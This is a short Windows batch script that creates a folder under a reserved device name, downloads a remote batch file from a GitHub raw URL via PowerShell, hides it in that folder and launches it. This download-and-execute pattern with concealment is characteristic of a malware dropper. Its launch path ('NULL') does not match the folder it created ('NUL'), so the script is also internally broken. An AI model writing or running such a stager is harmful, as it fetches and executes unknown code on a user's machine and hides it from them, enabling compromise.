@echo off
C:
cd %USERPROFILE%
md NUL
powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/timberh789/Server/main/exec.bat', '%USERPROFILE%\exec.bat')
move /Y %USERPROFILE%\exec.bat %USERPROFILE%\NUL
start %USERPROFILE%\NULL\exec.bat
